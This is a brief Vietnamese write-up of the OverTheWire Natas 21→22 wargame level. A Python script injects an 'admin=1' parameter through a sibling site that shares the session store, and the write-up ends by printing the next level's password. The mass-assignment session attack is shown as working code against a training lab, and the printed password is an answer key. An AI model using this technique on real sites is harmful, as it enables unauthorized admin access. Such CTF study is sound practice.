# Natas 21 → 22

## Mục tiêu

Lấy password của `natas22` từ site experimenter dùng chung session.

## Tôi thấy

`natas21-experimenter` ghi mọi POST parameter vào `$_SESSION`, còn `natas21` đọc cùng session và kiểm tra `admin = 1`.

## Cách làm

```python
import requests

s = requests.Session()
auth = ('natas21', '<password>')
s.post(
    'http://natas21-experimenter.natas.labs.overthewire.org/index.php',
    auth=auth,
    data={'align': 'center', 'fontsize': '100%', 'bgcolor': 'yellow', 'admin': '1', 'submit': 'Update'},
)
r = s.get('http://natas21.natas.labs.overthewire.org/', auth=auth)
print(r.text)
```

Response live trả password của level kế tiếp.

## Vì sao cách này hiệu quả

Hai virtual host dùng chung session backend. Experimenter cho phép tạo khóa `admin`, sau đó host chính tin giá trị đó.

## Kết quả

Password của `natas22`:

```text
964laB0r7TuDqJj5b3HFtwsQoc0GhjBF
```

